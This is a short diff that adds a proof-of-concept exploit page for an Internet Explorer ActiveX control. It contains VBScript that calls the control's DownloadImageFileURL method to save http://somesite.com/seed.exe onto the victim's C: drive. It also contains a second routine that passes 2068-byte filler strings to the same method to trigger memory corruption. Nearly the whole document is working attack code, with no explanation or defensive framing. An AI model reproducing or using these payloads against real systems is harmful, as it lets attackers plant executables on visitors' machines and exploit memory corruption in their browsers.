@@ -1,0 +1,25 @@
+&lt;object classid=&#039;clsid:D2797899-BE27-4CDB-892F-4FDC26EA9BA9&#039; 
+id=&#039;test&#039;&gt;&lt;/object&gt;
+
+&lt;input language=VBScript onclick=tryMe() type=button value=&#039;Click here 
+to start the arbitrary file download test&#039;&gt;
+
+&lt;input language=VBScript onclick=MemoryCorruption() type=button 
+value=&#039;Click here to start the memory corruption test&#039;&gt;
+
+&lt;script language=&#039;vbscript&#039;&gt;
+ Sub tryMe
+  test.DownloadImageFileURL &quot;http://somesite.com/seed.exe&quot;, 
+&quot;C:\seed.exe&quot;
+ End Sub
+&lt;/script&gt;
+
+&lt;script language=&#039;vbscript&#039;&gt;
+ Sub MemoryCorruption
+  buff_0 = String(2068, &quot;A&quot;)
+  
+  buff_1 = String(2068, &quot;B&quot;)
+  
+  test.DownloadImageFileURL buff_0, buff_1
+ End Sub  
+&lt;/script&gt;
